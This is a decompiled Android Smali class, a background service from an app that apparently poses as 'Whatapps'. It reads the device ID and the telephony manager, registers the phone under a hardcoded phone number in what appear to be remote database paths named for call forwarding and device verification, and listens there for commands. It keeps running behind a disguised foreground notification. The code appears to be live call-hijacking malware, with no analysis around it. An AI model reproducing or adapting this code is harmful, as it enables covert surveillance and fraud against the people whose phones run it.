.class public Lcom/shootii/rooomu/MyService;
.super Landroid/app/Service;
.source "SourceFile"


# static fields
.field public static final synthetic l:I


# instance fields
.field public final b:Ljava/lang/String;

.field public final c:Ld1/e;

.field public d:Landroid/os/CountDownTimer;

.field public e:Ld1/c;

.field public f:Ld1/c;

.field public g:LA1/f;

.field public h:LA1/g;

.field public i:Landroid/telephony/TelephonyManager;

.field public j:Ld1/c;

.field public k:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 4
    const-string v0, "+919381172328"

    .line 6
    iput-object v0, p0, Lcom/shootii/rooomu/MyService;->b:Ljava/lang/String;

    .line 8
    invoke-static {}, Ld1/e;->a()Ld1/e;

    .line 11
    move-result-object v0

    .line 12
    iput-object v0, p0, Lcom/shootii/rooomu/MyService;->c:Ld1/e;

    .line 14
    return-void
.end method


# virtual methods
.method public final onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public final onStartCommand(Landroid/content/Intent;II)I
    .locals 10

    .line 1
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 4
    move-result-object v0

    .line 5
    const-string v1, "android_id"

    .line 7
    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    .line 10
    move-result-object v0

    .line 11
    iput-object v0, p0, Lcom/shootii/rooomu/MyService;->k:Ljava/lang/String;

    .line 13
    new-instance v0, Ljava/lang/Thread;

    .line 15
    new-instance v2, LA1/e;

    .line 17
    const/4 v3, 0x0

    .line 18
    invoke-direct {v2, v3, p0}, LA1/e;-><init>(ILjava/lang/Object;)V

    .line 21
    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 24
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 27
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 30
    move-result-object v0

    .line 31
    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    .line 34
    move-result-object v0

    .line 35
    iget-object v2, p0, Lcom/shootii/rooomu/MyService;->c:Ld1/e;

    .line 37
    iget-object v3, p0, Lcom/shootii/rooomu/MyService;->b:Ljava/lang/String;

    .line 39
    invoke-virtual {v2, v3}, Ld1/e;->b(Ljava/lang/String;)Ld1/c;

    .line 42
    move-result-object v4

    .line 43
    const-string v5, "All_User"

    .line 45
    invoke-virtual {v4, v5}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 48
    move-result-object v4

    .line 49
    const-string v6, "Forwad_Status"

    .line 51
    invoke-virtual {v4, v6}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 54
    move-result-object v4

    .line 55
    invoke-virtual {v4, v0}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 58
    move-result-object v4

    .line 59
    iput-object v4, p0, Lcom/shootii/rooomu/MyService;->f:Ld1/c;

    .line 61
    invoke-virtual {v2, v3}, Ld1/e;->b(Ljava/lang/String;)Ld1/c;

    .line 64
    move-result-object v3

    .line 65
    invoke-virtual {v3, v5}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 68
    move-result-object v3

    .line 69
    const-string v4, "Call_For"

    .line 71
    invoke-virtual {v3, v4}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 74
    move-result-object v3

    .line 75
    invoke-virtual {v3, v0}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 78
    move-result-object v0

    .line 79
    iput-object v0, p0, Lcom/shootii/rooomu/MyService;->e:Ld1/c;

    .line 81
    const-string v0, "phone"

    .line 83
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 86
    move-result-object v0

    .line 87
    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 89
    iput-object v0, p0, Lcom/shootii/rooomu/MyService;->i:Landroid/telephony/TelephonyManager;

    .line 91
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 93
    const/16 v3, 0x1a

    .line 95
    if-lt v0, v3, :cond_0

    .line 97
    new-instance v4, LA1/f;

    .line 99
    invoke-direct {v4, p0}, LA1/f;-><init>(Lcom/shootii/rooomu/MyService;)V

    .line 102
    iput-object v4, p0, Lcom/shootii/rooomu/MyService;->g:LA1/f;

    .line 104
    :cond_0
    new-instance v4, LA1/g;

    .line 106
    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    .line 109
    move-result-object v5

    .line 110
    invoke-direct {v4, v5}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 113
    iput-object v4, p0, Lcom/shootii/rooomu/MyService;->h:LA1/g;

    .line 115
    iget-object v4, p0, Lcom/shootii/rooomu/MyService;->e:Ld1/c;

    .line 117
    new-instance v5, Ly1/c;

    .line 119
    const/4 v6, 0x4

    .line 120
    invoke-direct {v5, v6, p0}, Ly1/c;-><init>(ILjava/lang/Object;)V

    .line 123
    new-instance v6, Li1/B;

    .line 125
    new-instance v7, Ln1/h;

    .line 127
    iget-object v8, v4, Ld1/c;->b:Li1/e;

    .line 129
    iget-object v9, v4, Ld1/c;->c:Ln1/g;

    .line 131
    invoke-direct {v7, v8, v9}, Ln1/h;-><init>(Li1/e;Ln1/g;)V

    .line 134
    iget-object v8, v4, Ld1/c;->a:Li1/i;

    .line 136
    invoke-direct {v6, v8, v5, v7}, Li1/B;-><init>(Li1/i;Ld1/k;Ln1/h;)V

    .line 139
    invoke-virtual {v4, v6}, Ld1/c;->a(Li1/B;)V

    .line 142
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 145
    move-result-object v4

    .line 146
    invoke-static {v4, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    .line 149
    move-result-object v1

    .line 150
    iput-object v1, p0, Lcom/shootii/rooomu/MyService;->k:Ljava/lang/String;

    .line 152
    const-string v1, "Verify_Device"

    .line 154
    invoke-virtual {v2, v1}, Ld1/e;->b(Ljava/lang/String;)Ld1/c;

    .line 157
    move-result-object v1

    .line 158
    iget-object v2, p0, Lcom/shootii/rooomu/MyService;->k:Ljava/lang/String;

    .line 160
    invoke-virtual {v1, v2}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 163
    move-result-object v1

    .line 164
    new-instance v2, LA1/i;

    .line 166
    const/4 v4, 0x0

    .line 167
    invoke-direct {v2, p0, v4, v1}, LA1/i;-><init>(Ljava/lang/Object;ILjava/lang/Object;)V

    .line 170
    new-instance v4, Li1/B;

    .line 172
    new-instance v5, Ln1/h;

    .line 174
    iget-object v6, v1, Ld1/c;->b:Li1/e;

    .line 176
    iget-object v7, v1, Ld1/c;->c:Ln1/g;

    .line 178
    invoke-direct {v5, v6, v7}, Ln1/h;-><init>(Li1/e;Ln1/g;)V

    .line 181
    iget-object v6, v1, Ld1/c;->a:Li1/i;

    .line 183
    invoke-direct {v4, v6, v2, v5}, Li1/B;-><init>(Li1/i;Ld1/k;Ln1/h;)V

    .line 186
    invoke-virtual {v1, v4}, Ld1/c;->a(Li1/B;)V

    .line 189
    const/4 v1, 0x0

    .line 190
    if-lt v0, v3, :cond_1

    .line 192
    invoke-static {}, LA1/a;->c()Landroid/app/NotificationChannel;

    .line 195
    move-result-object v2

    .line 196
    goto :goto_0

    .line 197
    :cond_1
    move-object v2, v1

    .line 198
    :goto_0
    if-lt v0, v3, :cond_2

    .line 200
    const-class v4, Landroid/app/NotificationManager;

    .line 202
    invoke-virtual {p0, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    .line 205
    move-result-object v4

    .line 206
    check-cast v4, Landroid/app/NotificationManager;

    .line 208
    invoke-static {v4, v2}, LA1/a;->q(Landroid/app/NotificationManager;Landroid/app/NotificationChannel;)V

    .line 211
    :cond_2
    if-lt v0, v3, :cond_3

    .line 213
    invoke-static {p0}, LA1/a;->b(Lcom/shootii/rooomu/MyService;)Landroid/app/Notification$Builder;

    .line 216
    move-result-object v1

    .line 217
    const-string v2, "Whatapps service"

    .line 219
    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    .line 222
    move-result-object v1

    .line 223
    const-string v2, "Whatapps"

    .line 225
    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    .line 228
    move-result-object v1

    .line 229
    const v2, 0x7f0700a6

    .line 232
    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    .line 235
    move-result-object v1

    .line 236
    :cond_3
    const/16 v2, 0x1d

    .line 238
    if-lt v0, v2, :cond_4

    .line 240
    invoke-virtual {v1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    .line 243
    move-result-object v0

    .line 244
    invoke-static {p0, v0}, LA/b;->p(Lcom/shootii/rooomu/MyService;Landroid/app/Notification;)V

    .line 247
    goto :goto_1

    .line 248
    :cond_4
    invoke-virtual {v1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    .line 251
    move-result-object v0

    .line 252
    const/4 v1, 0x1

    .line 253
    invoke-virtual {p0, v1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    .line 256
    :goto_1
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    .line 259
    move-result p1

    .line 260
    return p1
.end method
